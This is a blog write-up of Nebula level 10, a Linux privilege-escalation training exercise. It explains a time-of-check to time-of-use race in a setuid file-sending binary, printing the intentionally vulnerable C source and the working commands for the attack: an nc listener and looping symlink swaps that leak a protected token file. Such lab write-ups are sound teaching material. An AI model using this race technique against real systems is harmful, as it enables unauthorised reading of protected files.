---
title: "Writeup: Nebula (level 10)"
date: 2020-12-22T14:36:26+08:00
draft: false
---

Nebula is a virtual machine that covers a variety of challenges about Linux privilege escalation, scripting language issues, and file system race conditions. It is available at [Exploit Exercises](https://exploit-exercises.lains.space/).

<br>

## Level 10

The description of Level 10 is provided as follows. 

```
The setuid binary at /home/flag10/flag10 binary will upload any file given, 
as long as it meets the requirements of the access() system call.

To do this level, log in as the level10 account with the password level10. 
Files for this level can be found in /home/flag10.
```

<br>

## Solution 1

In this challenge, Nebula left a sensitive file "x" in /home/level10. 

![](https://github.com/chuang76/image/blob/master/10-2.PNG?raw=true)

It contains ASCII text. Though it shows nothing when we type in cat command (since the file may contain too many blank lines), we can use od command to view the contents of x instead. 

![](https://github.com/chuang76/image/blob/master/10-3.PNG?raw=true)

As you can see, it shows 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27. This strange token may be the password. Let's give it a try. 

![](https://github.com/chuang76/image/blob/master/10-4.PNG?raw=true)

Here is the flag. 

![](https://github.com/chuang76/image/blob/master/10-5.PNG?raw=true)

<br>

## Solution 2

Let's go back to the directory /home/flag10. Here is its contents. 

![](https://github.com/chuang76/image/blob/master/10-1.PNG?raw=true)

The source code of the executable flag10 is available. The program is going to check the file permission, connect to the port 18211, then read something from the port, and write the data to the buffer.

```
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc < 3) {
      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf("Connecting to %s:18211 .. ", host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
          printf("Unable to connect to host %s\n", host);
          exit(EXIT_FAILURE);
      }

#define HITHERE ".oO Oo.\n"
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf("Unable to write banner to host %s\n", host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf("Connected!\nSending file .. "); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf("Damn. Unable to open file\n");
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf("Unable to read from file: %s\n", strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf("wrote file!\n");

  } else {
      printf("You don't have access to %s\n", file);
  }
}
```

<br>

## The first attempt

Our goal is to view the contents of the file "token". So I just create a file in /tmp directory which is pointed to /home/flag10/token via the symbolic link. Then open two terminals (you can use Ctrl + Alt + Fn to switch between TTYs), for the one is used to listen the port and receive the message, the other is used to run the executable /home/flag10/flag10 with the argument 127.0.0.1 (host) and /tmp/vul (file). 

However, it's failed. The error message indicates that I don't have access to the file. The reason is: the argument R_OK in the function access() checks *real user ID*, not effective user ID like open() function checks. Therefore, we can not pass the verification access() simply with the symbolic link. 

<br>

## The second attempt

Let's view the source code again. The program is a classical [time-of-check to time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use) (TOCTOU), which is a software bug caused by the race condition. Though we don't have the ability to change the internal memory of the program, we can exploit the race condition to trick the Set-UID. That is, after passing the verification, and before opening the file, we make the file points to our target file /home/flag10/token. Since modern processors run billions of instructions per second, the duration (TOCTOW window) is very short, we need to try it repeatedly. To win the race condition, we can design the workflow as follows. 

```
1. TTY1: used to keep listening to the port 18211
2. TTY2: keep running the executable /home/flag10/flag10
3. TTY3: keep creating a symbolic link to a writable file (pass the verfication)
         and creating another symbolic link to /home/flag10/token (our target)
```

Hence, for TTY1, run 

```
$ nc -k -l 18211
```

for TTY2, run

```
$ while true; do /home/flag10/flag10 /tmp/vul 127.0.0.1; done
```

for TTY3, run

```
$ while true; do ln -sf /tmp/test /tmp/vul; ln -sf /home/flag10/token /tmp/vul; done
```

Here is the result of TTY1. As you can see, sometimes it prints out "test" (contents of /tmp/test), while sometimes it prints out the contents of our target file, /home/flag10/token. 

![](https://github.com/chuang76/image/blob/master/10-10.PNG?raw=true)

Here is the flag. 

![](https://github.com/chuang76/image/blob/master/10-11.PNG?raw=true)









